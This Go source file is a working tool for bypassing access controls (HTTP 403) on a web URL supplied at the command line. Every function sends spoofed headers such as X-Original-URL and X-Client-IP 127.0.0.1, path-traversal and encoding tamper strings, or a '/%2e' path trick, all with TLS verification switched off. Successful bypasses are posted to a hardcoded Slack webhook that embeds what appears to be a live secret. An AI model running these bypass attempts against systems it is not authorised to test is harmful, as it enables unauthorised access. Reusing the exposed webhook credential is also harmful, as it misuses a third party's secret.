package main

import (
   
    "bytes"
    "crypto/tls"
    "encoding/json"
    "errors"
    "time"
    "fmt"
    "os"
    "net/url"
    "net/http"
    "log"
    "net/http/httputil"

)

type SlackRequestBody struct {
    Text string `json:"text"`
}

func SendSlackNotification(webhookUrl string, msg string) error {

    slackBody, _ := json.Marshal(SlackRequestBody{Text: msg})
    req, err := http.NewRequest(http.MethodPost, webhookUrl, bytes.NewBuffer(slackBody))
    if err != nil {
        return err
    }

    req.Header.Add("Content-Type", "application/json")

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

    buf := new(bytes.Buffer)
    buf.ReadFrom(resp.Body)
    if buf.String() != "ok" {
        return errors.New("Non-ok response returned from Slack")
    }
    return nil
}
     
func x_rewrite_url(url1 string) {  

         webhookUrl := "https://hooks.slack.com/services/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"   
         u, _ := url.Parse(url1)
         path := u.Path
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}      
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("X-rewrite-url", path)
         req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36")
         res, err := client.Do(req)
         
         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
             fmt.Println(err)
         }
         //fmt.Println(string(requestDump))
         //fmt.Println(res.StatusCode)
         //fmt.Println(len(string(requestDump)))
         log.Printf("%d %d",res.StatusCode, len(string(requestDump)))
         if res.StatusCode==200{
            text:=fmt.Sprintf("Bypassed For URL %v through header check\n", url1)
            SendSlackNotification(webhookUrl,text) 
         }
}

func Referer(url1 string) {

         webhookUrl := "https://hooks.slack.com/services/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"
//         u, _ := url.Parse(url1)
//         path := u.Path
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("Referer", url1)

         req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36")
         res, err := client.Do(req)

         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
             fmt.Println(err)
         }
         //fmt.Println(string(requestDump))
         //fmt.Println(res.StatusCode)
         //fmt.Println(len(string(requestDump)))
         log.Printf("%d %d",res.StatusCode, len(string(requestDump)))
         if res.StatusCode==200{
            text:=fmt.Sprintf("Bypassed For URL %v through header check\n", url1)
            SendSlackNotification(webhookUrl,text)
         }
}


func X_Original_URL(url1 string) {

         webhookUrl := "https://hooks.slack.com/services/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"
         u, _ := url.Parse(url1)
         path := u.Path
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("X-Original-URL", path)

         req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36")
         res, err := client.Do(req)

         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
             fmt.Println(err)
         }
         //fmt.Println(string(requestDump))
  //       fmt.Println(res.StatusCode)
//         fmt.Println(len(string(requestDump)))
         log.Printf("%d %d",res.StatusCode, len(string(requestDump)))
         if res.StatusCode==200{
            text:=fmt.Sprintf("Bypassed For URL %v through header check\n", url1)
            SendSlackNotification(webhookUrl,text)
         }
}

func X_Client_IP(url1 string) {

         webhookUrl := "https://hooks.slack.com/services/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"
  //       u, _ := url.Parse(url1)
  //       path := u.Path
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("X-Client-IP", "127.0.0.1")

         req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36")
         res, err := client.Do(req)

         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
             fmt.Println(err)
         }
         //fmt.Println(string(requestDump))
         //fmt.Println(res.StatusCode)
         //fmt.Println(len(string(requestDump)))
         log.Printf("%d %d",res.StatusCode, len(string(requestDump)))
         if res.StatusCode==200{
            text:=fmt.Sprintf("Bypassed For URL %v through header check\n", url1)
            SendSlackNotification(webhookUrl,text)
         }
}

func file_tamper(url1 string) {


         webhookUrl := "https://hooks.slack.com/services/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"
         tamper:= []string{"??","?","#","&","%20","%09","/","/..;/","../","..%2f","..;/","\\..\\.\\","..%00/","..%5c","..\\","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json","?.css"}
         for _, tamp := range tamper {
               u := url1+tamp
               http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
               client := &http.Client{}
               req, err := http.NewRequest("GET",u, nil)
               req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36")
               res, err := client.Do(req)

               if err != nil{
                  log.Fatal(err)
               }

               requestDump, err := httputil.DumpRequest(req, true)
               if err != nil {
                  fmt.Println(err)
               }
               fmt.Println(string(requestDump))
               fmt.Println(res.StatusCode)
               //fmt.Println(len(string(requestDump)))
               log.Printf("%d %d",res.StatusCode, len(string(requestDump)))
               if res.StatusCode==200{
                  text:=fmt.Sprintf("Bypassed For URL %v \n", u)
                  SendSlackNotification(webhookUrl,text)
                  break

         }


           }
}


func intigriti_tamper(url1 string) {

         webhookUrl := "https://hooks.slack.com/services/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"
         u, _ := url.Parse(url1)
         path := u.Path
         url2 := u.Scheme+"://"+u.Host+"/%2e"+path
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url2, nil)
         req.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36")
         res, err := client.Do(req)
         if err != nil{
            log.Fatal(err)
         }

         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
                  fmt.Println(err)
         }
         //fmt.Println(string(requestDump))
         //fmt.Println(res.StatusCode)         fmt.Println(len(string(requestDump)))
         log.Printf("%d %d",res.StatusCode, len(string(requestDump)))
         if res.StatusCode==200{
            text:=fmt.Sprintf("Bypassed For URL %v using intigriti check\n", url2)
            SendSlackNotification(webhookUrl,text)

         }

}

func main() {
         url_test := os.Args[1]
//         fmt.Println(url_test)
         x_rewrite_url(url_test)
         Referer(url_test)
         X_Original_URL(url_test)
         X_Client_IP(url_test)
         file_tamper(url_test)
         intigriti_tamper(url_test)
}

